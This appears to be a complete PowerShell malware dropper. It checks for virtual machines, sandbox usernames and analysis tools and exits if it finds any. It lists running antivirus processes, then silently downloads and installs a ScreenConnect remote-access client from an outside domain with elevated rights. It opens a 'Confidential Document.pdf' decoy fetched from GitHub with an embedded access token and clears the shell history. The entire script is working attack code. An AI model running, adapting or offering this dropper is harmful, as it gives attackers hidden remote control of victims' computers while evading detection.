$ErrorActionPreference = 'Stop'
$state = New-Object System.Collections.ArrayList

$sb = $false
$cs  = Get-WmiObject Win32_ComputerSystem
$mem = $cs.TotalPhysicalMemory
$cpu = (Get-WmiObject Win32_Processor).NumberOfCores

if ($cs.Model -match 'VirtualBox|VMware|QEMU|Xen|Virtual Machine|Hyper-V') { $sb = $true }
if ($mem -lt 3GB)  { $sb = $true }
if ($cpu -lt 2)    { $sb = $true }
if ($env:USERNAME -in @('Bruno','Sandbox','Malware','Test','VirusTotal')) { $sb = $true }

$toolProcs = 'vboxservice|vboxtray|VGAuthService|vmtoolsd|SbieSvc|Procmon|proc_exp|wireshark|dumpcap|ollydbg|x64dbg|ida64|fakenet|windbg|processhacker|sysinspector|frida|dnSpy|de4dot'
if (Get-Process | Where-Object { $_.Name -match $toolProcs }) { $sb = $true }

if ($sb) { Clear-History; exit }

$avProcs = 'MsMpEng|avp|avgnt|avguard|ekrn|bdagent|ccSvcHst|mbamservice|NortonSecurity|V3Svc|SAVService|McAfeeFramework|SentinelAgent|Cylance|CrowdStrike'
$found = @(Get-Process | Where-Object { $_.Name -match $avProcs } | Select-Object -ExpandProperty Name -Unique)

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13

$msiUrl = 'https://lerealsiegediaries.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
$msiPath = Join-Path $env:TEMP 'setup.msi'

# Download MSI
$wc = New-Object System.Net.WebClient
$wc.Headers.Add('User-Agent', 'Mozilla/5.0')
$wc.DownloadFile($msiUrl, $msiPath)

# UAC install
Start-Process msiexec.exe -ArgumentList "/i `"$msiPath`" /qn /norestart" -Verb RunAs -PassThru -Wait

# Cleanup
try { Remove-Item $msiPath -Force } catch {}

# Decoy PDF
$GhToken = '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'
$hdrs = @{"Authorization"="token $GhToken"; "Accept"="application/vnd.github.v3+json"}
$resp = Invoke-RestMethod -Uri 'https://api.github.com/repos/slynet999-coder/Yambo/contents/Confidential Document.pdf' -Headers $hdrs
$pdfPath = Join-Path $env:TEMP 'Confidential Document.pdf'
[IO.File]::WriteAllBytes($pdfPath, [Convert]::FromBase64String($resp.content))
Start-Process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -ArgumentList "`"$pdfPath`""

Clear-History
